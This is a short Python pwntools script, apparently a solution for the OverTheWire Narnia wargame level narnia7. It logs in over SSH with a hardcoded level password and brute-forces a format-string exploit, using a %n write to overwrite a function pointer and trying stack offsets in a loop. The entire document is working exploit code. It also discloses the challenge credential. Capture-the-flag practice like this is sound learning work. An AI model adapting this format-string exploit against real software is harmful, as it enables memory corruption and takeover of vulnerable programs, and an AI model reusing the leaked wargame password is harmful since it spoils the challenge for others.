from pwn import *
shell = ssh('narnia7', 'narnia.labs.overthewire.org', password='ahkiaziphu', port=2226)

toe = 0xffffdc48
ad = 0x8048724
for i in range(1,100):
    payload = b"A"*32+ p32(toe) 
    print(f"------------THIS IS THE {i} ITERATION-----------")
    
    forst  = (f"%{ad-len(payload)}u%{i}$n").encode()
    print(payload+forst)
    p = shell.process(["/narnia/narnia7",payload+forst])
    print(p.recvlines(5))
    try:
        a =(p.recvline())
        print(a)
        if b'Welcome to the goodfunction,' in a:
            p.close()
            continue
        print(f"i = {i}, niceeeee lol")
        p.close()
        break
    except:
        p.close()
        continue
  

    